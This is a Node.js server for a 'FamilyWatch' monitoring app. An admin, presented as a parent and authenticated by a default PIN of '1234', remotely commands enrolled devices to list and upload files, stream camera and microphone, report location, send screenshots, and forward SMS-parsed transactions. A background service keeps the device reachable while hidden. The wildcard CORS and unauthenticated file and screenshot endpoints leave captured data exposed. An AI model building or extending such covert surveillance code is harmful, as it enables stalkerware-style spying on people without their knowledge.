const http = require('http')
const fs   = require('fs')
const path = require('path')
const { WebSocketServer, WebSocket } = require('ws')
const { AccessToken } = require('livekit-server-sdk')

const ADMIN_PIN   = process.env.ADMIN_PIN || '1234'
const CLIENT_DIR  = path.join(__dirname, '../client/dist')
const APP_VERSION = process.env.APP_VERSION || '1.0.0'
const APK_URL     = `https://github.com/dailycoder09/apkformobile/releases/latest/download/meeee.apk`
const MAX_FILE_MB = 200

// In-memory file store: requestId → { data, mime, name, adminId, fromUserId }
// Auto-expires after 10 minutes
const fileStore = new Map()

// Screenshot store: id → { data, userId, userName, ts }
// Keyed by userId for list lookup: screenshotIndex userId → [id, ...]
const screenshotStore = new Map()
const screenshotIndex = new Map()  // userId → [id, ...]
const SCREENSHOT_TTL  = 24 * 60 * 60 * 1000  // 24 h

function storeScreenshot(userId, userName, data) {
  const id = `${userId}-${Date.now()}`
  screenshotStore.set(id, { data, userId, userName, ts: Date.now() })
  if (!screenshotIndex.has(userId)) screenshotIndex.set(userId, [])
  screenshotIndex.get(userId).push(id)
  // Auto-delete after 24 h
  setTimeout(() => {
    screenshotStore.delete(id)
    const list = screenshotIndex.get(userId)
    if (list) {
      const idx = list.indexOf(id)
      if (idx !== -1) list.splice(idx, 1)
    }
  }, SCREENSHOT_TTL)
  return id
}

const MIME = {
  '.html': 'text/html', '.js': 'application/javascript',
  '.css': 'text/css',   '.json': 'application/json',
  '.png': 'image/png',  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon', '.webmanifest': 'application/manifest+json',
}

function serveStatic(req, res) {
  try {
    const urlPath = req.url.split('?')[0]
    let filePath = path.join(CLIENT_DIR, urlPath === '/' ? 'index.html' : urlPath)

    if (!filePath.startsWith(CLIENT_DIR)) {
      res.writeHead(403); res.end('Forbidden'); return
    }

    if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
      filePath = path.join(CLIENT_DIR, 'index.html')
    }

    const ext = path.extname(filePath)
    res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' })

    const stream = fs.createReadStream(filePath)
    stream.on('error', (err) => {
      console.error('Stream error:', err.message)
      if (!res.headersSent) { res.writeHead(500); res.end('Error reading file') }
    })
    stream.pipe(res)
  } catch (err) {
    console.error('Serve error:', err.message)
    if (!res.headersSent) { res.writeHead(500); res.end('Internal Server Error') }
  }
}

const CORS = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS' }

const server = http.createServer(async (req, res) => {
  try {
    const urlPath = req.url.split('?')[0]

    // CORS preflight
    if (req.method === 'OPTIONS') {
      res.writeHead(204, CORS); res.end(); return
    }

    // ── File upload from child device ─────────────────────────────────────
    if (req.method === 'POST' && urlPath.startsWith('/api/file/')) {
      const requestId  = urlPath.replace('/api/file/', '')
      const adminId    = req.headers['x-admin-id'] || ''
      const fromUserId = req.headers['x-user-id']  || ''
      const name       = decodeURIComponent(req.headers['x-file-name'] || 'file')
      const mime       = req.headers['content-type'] || 'application/octet-stream'

      const chunks = []
      let totalBytes = 0
      const maxBytes = MAX_FILE_MB * 1024 * 1024

      req.on('data', chunk => {
        totalBytes += chunk.length
        if (totalBytes > maxBytes) {
          req.destroy()
          res.writeHead(413); res.end(`File exceeds ${MAX_FILE_MB}MB limit`)
          return
        }
        chunks.push(chunk)
      })

      req.on('end', () => {
        const data = Buffer.concat(chunks)
        fileStore.set(requestId, { data, mime, name, adminId, fromUserId })

        // Notify the waiting admin via WebSocket
        const admin = admins.get(adminId)
        if (admin) {
          send(admin.ws, {
            type: 'file_ready',
            requestId,
            name,
            size: data.length,
            mimeType: mime,
            fromUserId,
          })
        }

        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ ok: true }))

        // Auto-delete after 10 minutes to free memory
        setTimeout(() => fileStore.delete(requestId), 10 * 60 * 1000)
      })

      req.on('error', () => { res.writeHead(500); res.end('Upload error') })
      return
    }

    // ── File download for admin (supports Range for video streaming) ─────
    if (req.method === 'GET' && urlPath.startsWith('/api/file/')) {
      const requestId = urlPath.replace('/api/file/', '')
      const file = fileStore.get(requestId)
      if (!file) { res.writeHead(404); res.end('File not found or expired'); return }

      const total = file.data.length
      const range = req.headers.range

      if (range) {
        // Serve requested byte range — enables video seeking + chunked buffering
        const [startStr, endStr] = range.replace(/bytes=/, '').split('-')
        const start = parseInt(startStr, 10)
        const end   = endStr ? parseInt(endStr, 10) : Math.min(start + 1024 * 1024, total - 1)
        const chunkSize = end - start + 1
        res.writeHead(206, {
          ...CORS,
          'Content-Range':  `bytes ${start}-${end}/${total}`,
          'Accept-Ranges':  'bytes',
          'Content-Length': chunkSize,
          'Content-Type':   file.mime,
        })
        res.end(file.data.slice(start, end + 1))
      } else {
        res.writeHead(200, {
          ...CORS,
          'Accept-Ranges':       'bytes',
          'Content-Type':        file.mime,
          'Content-Disposition': `inline; filename="${encodeURIComponent(file.name)}"`,
          'Content-Length':      total,
        })
        res.end(file.data)
      }
      return
    }

    // ── Screenshot upload from child ─────────────────────────────────────────
    if (req.method === 'POST' && urlPath.startsWith('/api/screenshot/')) {
      const userId   = urlPath.replace('/api/screenshot/', '')
      const userName = decodeURIComponent(req.headers['x-user-name'] || 'User')
      const chunks = []; let total = 0
      req.on('data', c => { total += c.length; if (total < 5 * 1024 * 1024) chunks.push(c) })
      req.on('end', () => {
        const data = Buffer.concat(chunks)
        storeScreenshot(userId, userName, data)
        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ ok: true }))
      })
      req.on('error', () => { res.writeHead(500); res.end() })
      return
    }

    // ── Screenshot list for admin ────────────────────────────────────────────
    if (req.method === 'GET' && urlPath.startsWith('/api/screenshots/')) {
      const userId = urlPath.replace('/api/screenshots/', '')
      const ids = screenshotIndex.get(userId) || []
      const list = ids.map(id => {
        const s = screenshotStore.get(id)
        return s ? { id, ts: s.ts, size: s.data.length } : null
      }).filter(Boolean).sort((a, b) => b.ts - a.ts)
      res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ screenshots: list }))
      return
    }

    // ── Single screenshot download ───────────────────────────────────────────
    if (req.method === 'GET' && urlPath.startsWith('/api/screenshot/')) {
      const id = urlPath.replace('/api/screenshot/', '')
      const shot = screenshotStore.get(id)
      if (!shot) { res.writeHead(404); res.end('Not found or expired'); return }
      res.writeHead(200, { ...CORS, 'Content-Type': 'image/webp', 'Content-Length': shot.data.length })
      res.end(shot.data)
      return
    }

    // LiveKit token — child publishes, admin subscribes, room = child's userId
    if (urlPath === '/api/lk-token' && req.method === 'GET') {
      const params   = new URL(req.url, 'http://x').searchParams
      const room     = params.get('room')     || ''
      const identity = params.get('identity') || 'anon'
      const lkUrl    = process.env.LIVEKIT_URL        || ''
      const apiKey   = process.env.LIVEKIT_API_KEY    || ''
      const apiSecret = process.env.LIVEKIT_API_SECRET || ''
      if (!apiKey || !apiSecret || !lkUrl) {
        res.writeHead(503, CORS); res.end(JSON.stringify({ error: 'LiveKit not configured' })); return
      }
      try {
        const at = new AccessToken(apiKey, apiSecret, { identity, ttl: '10m' })
        at.addGrant({
          roomJoin:      true,
          room,
          canPublish:    identity !== 'admin',
          canSubscribe:  true,
          canPublishData: false,
        })
        const token = await at.toJwt()
        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ token, url: lkUrl }))
      } catch (e) {
        res.writeHead(500, CORS); res.end(JSON.stringify({ error: e.message }))
      }
      return
    }

    // Version check endpoint for auto-update
    if (urlPath === '/api/version') {
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' })
      res.end(JSON.stringify({ version: APP_VERSION, apkUrl: APK_URL }))
      return
    }

    if (fs.existsSync(CLIENT_DIR)) {
      serveStatic(req, res)
    } else {
      res.writeHead(503, { 'Content-Type': 'text/plain' })
      res.end('App not built yet. Run: npm --prefix client run build')
    }
  } catch (err) {
    console.error('Request error:', err.message)
    res.writeHead(500); res.end('Internal Server Error')
  }
})

const wss = new WebSocketServer({ server, path: '/ws' })

const admins       = new Map()   // userId → { ws, userId, name }
const users        = new Map()   // userId → { ws, userId, name }
const byWs         = new Map()   // ws → meta
const transactions = new Map()   // userId → transaction[]

let idSeq = 0
function makeId() { return `${++idSeq}-${Math.random().toString(36).slice(2, 6)}` }

function send(ws, msg) {
  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg))
}

function broadcastToAdmins(msg) {
  for (const [, m] of admins) send(m.ws, msg)
}

function broadcastAll(msg) {
  for (const [ws] of byWs) send(ws, msg)
}

function getUserList() {
  return [...users.values()]
    .filter(u => !u.isBg)
    .map(u => ({ id: u.userId, name: u.name }))
}

wss.on('connection', (ws) => {
  let meta = null

  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw)

      // ── Authentication ─────────────────────────────
      if (msg.type === 'auth') {
        if (meta) return

        const userId = makeId()

        if (msg.role === 'admin') {
          if (msg.pin !== ADMIN_PIN) {
            send(ws, { type: 'auth_fail', reason: 'Wrong PIN' })
            return
          }
          meta = { ws, role: 'admin', userId, name: 'Parent' }
          admins.set(userId, meta)
          byWs.set(ws, meta)
          send(ws, { type: 'auth_ok', role: 'admin', userId, users: getUserList() })
          return
        }

        if (msg.role === 'user') {
          const rawName = (msg.name || '').trim().slice(0, 30) || `User-${userId.split('-')[0]}`
          // Native background service appends __bg__ — strip it for display
          const isBg   = rawName.endsWith('__bg__')
          const name   = isBg ? rawName.slice(0, -6) : rawName

          if (isBg) {
            // Background service: find the existing JS session for this user
            // and link them — don't create a visible new entry
            const existing = [...users.values()].find(u => u.name === name)
            if (existing) {
              // Store bg ws on the existing meta so file requests go to native
              existing.bgWs = ws
              meta = { ws, role: 'user', userId, name, isBg: true, primaryId: existing.userId }
              byWs.set(ws, meta)
              // Give native service the same userId as the JS session
              send(ws, { type: 'auth_ok', role: 'user', userId: existing.userId, name, users: [] })
              return
            }
          }

          // Reconnect to existing session with same name — preserves userId so
          // admin panel's targetUser.id stays valid across screen-lock reconnects
          let reconnecting = null
          for (const [, m] of users) {
            if (m.name === name && !m.isBg) { reconnecting = m; break }
          }

          if (reconnecting) {
            byWs.delete(reconnecting.ws)
            try { reconnecting.ws.close() } catch {}
            reconnecting.ws = ws
            meta = reconnecting
            byWs.set(ws, meta)
            send(ws, { type: 'auth_ok', role: 'user', userId: reconnecting.userId, name, users: getUserList() })
            // No user_left / user_joined — seamless reconnect, same userId
            return
          }

          meta = { ws, role: 'user', userId, name, isBg: false }
          users.set(userId, meta)
          byWs.set(ws, meta)
          send(ws, { type: 'auth_ok', role: 'user', userId, name, users: getUserList() })
          broadcastToAdmins({ type: 'user_joined', user: { id: userId, name } })
          broadcastAll({ type: 'users_list', users: getUserList() })
          return
        }
      }

      if (!meta) return

      // ── Admin commands ──────────────────────────────
      if (meta.role === 'admin') {
        if (['ls', 'read_file', 'stop_camera',
             'start_mic', 'stop_mic', 'start_location', 'stop_location'].includes(msg.type)) {
          const target = users.get(msg.targetId)
          if (target) send(target.bgWs || target.ws, { ...msg, fromAdminId: meta.userId })
        }
        // start_camera → both: browser ws (LiveKit publish) AND bgWs (JPEG fallback)
        if (msg.type === 'start_camera') {
          const target = users.get(msg.targetId)
          if (target) {
            send(target.ws, { ...msg, fromAdminId: meta.userId })
            if (target.bgWs) send(target.bgWs, { ...msg, fromAdminId: meta.userId })
          }
        }
        // Admin DM to a specific user
        if (msg.type === 'dm') {
          const target = [...byWs.values()].find(m => m.userId === msg.toId)
          if (target) {
            const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
            send(target.ws, out)
            send(ws, { ...out, own: true })
          }
        }
        return
      }

      // ── Admin commands ── transactions ─────────────
      if (meta.role === 'admin' && msg.type === 'transactions_get') {
        const list = transactions.get(msg.userId) || []
        send(ws, { type: 'transactions_list', userId: msg.userId, transactions: list })
        return
      }

      // ── User messages ───────────────────────────────
      if (meta.role === 'user') {
        // Transaction added by user (manual or SMS-parsed) — store + broadcast to admins
        if (msg.type === 'transaction_add') {
          const txn = { ...msg.transaction, userId: meta.userId, userName: meta.name }
          if (!transactions.has(meta.userId)) transactions.set(meta.userId, [])
          transactions.get(meta.userId).unshift(txn)
          broadcastToAdmins({ type: 'transaction_new', transaction: txn, fromUserId: meta.userId, fromUserName: meta.name })
          return
        }

        // Self-fetch — user requesting their own transaction history
        if (msg.type === 'transactions_get') {
          const list = transactions.get(meta.userId) || []
          send(ws, { type: 'transactions_list', userId: meta.userId, transactions: list })
          return
        }

        if (['ls_result', 'file_result', 'file_start', 'file_chunk', 'file_end', 'file_error',
             'camera_frame', 'audio_chunk', 'location_update'].includes(msg.type)) {
          const admin = admins.get(msg.forAdminId)
          // Use primary userId for bg connections so RemoteFileBrowser filter matches
          const fromUserId = meta.isBg ? meta.primaryId : meta.userId
          if (admin) send(admin.ws, { ...msg, fromUserId })
          return
        }
        // Group chat — broadcast to all
        if (msg.type === 'text') {
          const out = { type: 'text', text: msg.text, from: meta.name, fromId: meta.userId, ts: Date.now() }
          send(ws, { ...out, own: true })
          for (const [client] of byWs) {
            if (client !== ws) send(client, out)
          }
        }
        // Direct message — send to specific user only
        if (msg.type === 'dm') {
          const target = [...byWs.values()].find(m => m.userId === msg.toId)
          if (target) {
            const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
            send(target.ws, out)
            send(ws, { ...out, own: true })
          }
        }
      }

    } catch (e) {
      console.error('parse error:', e.message)
    }
  })

  ws.on('close', () => {
    if (!meta) return
    // If this WS was superseded by a reconnect (meta.ws updated to new socket), ignore its close
    if (meta.ws !== ws && meta.role !== 'admin') return
    byWs.delete(ws)
    if (meta.role === 'admin') {
      admins.delete(meta.userId)
    } else if (meta.isBg) {
      // Background session closed — remove bgWs reference from primary session
      const primary = [...users.values()].find(u => u.userId === meta.primaryId)
      if (primary) delete primary.bgWs
    } else {
      // If bg service is still alive, keep child visible in admin list
      // Commands route via bgWs (target.bgWs || target.ws), so admin can still
      // send start_mic/start_location while primary WS reconnects after screen unlock
      if (meta.bgWs && meta.bgWs.readyState === WebSocket.OPEN) {
        // Primary WS dropped but bg service is running — child stays visible
        // meta.ws is now closed; send() will skip it; bgWs takes all commands
      } else {
        users.delete(meta.userId)
        broadcastToAdmins({ type: 'user_left', userId: meta.userId })
        broadcastAll({ type: 'users_list', users: getUserList() })
      }
    }
  })

  ws.on('error', (e) => console.error('ws error:', e.message))
})

const PORT = process.env.PORT || 3001
server.on('error', (e) => {
  if (e.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} busy — run: lsof -ti :${PORT} | xargs kill -9`)
    process.exit(1)
  }
})
server.listen(PORT, () => {
  console.log(`\n🚀 FamilyWatch running on port ${PORT}`)
  console.log(`   App:       http://localhost:${PORT}`)
  console.log(`   WebSocket: ws://localhost:${PORT}/ws`)
  console.log(`   Admin PIN: ${ADMIN_PIN}`)
  console.log(`   Dist:      ${fs.existsSync(CLIENT_DIR) ? '✓ found' : '✗ MISSING — run: npm --prefix client run build'}\n`)
})
